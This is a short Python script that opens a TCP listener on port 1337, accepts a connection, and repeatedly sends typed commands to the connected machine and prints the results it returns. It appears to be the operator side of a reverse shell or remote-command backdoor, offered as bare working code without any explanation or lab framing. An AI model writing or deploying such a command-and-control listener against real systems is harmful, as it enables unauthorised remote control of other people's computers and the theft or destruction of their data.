import socket
import decode_bytes

host = ""
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(3)

connection, addr = s.accept()
print("===== " + addr[0] + " is connected =====")
print()
print("==================================================")

while True:
    cmd = input("Command: ")
    connection.send(str.encode(cmd))
    bytes_data = connection.recv(506)
    try:
        data = decode_bytes.replace_special_character(bytes_data).decode("utf-8")
    except Exception as e:
        data = bytes_data
    print("Result: ")
    print(data)
    print()
    print("==================================================")
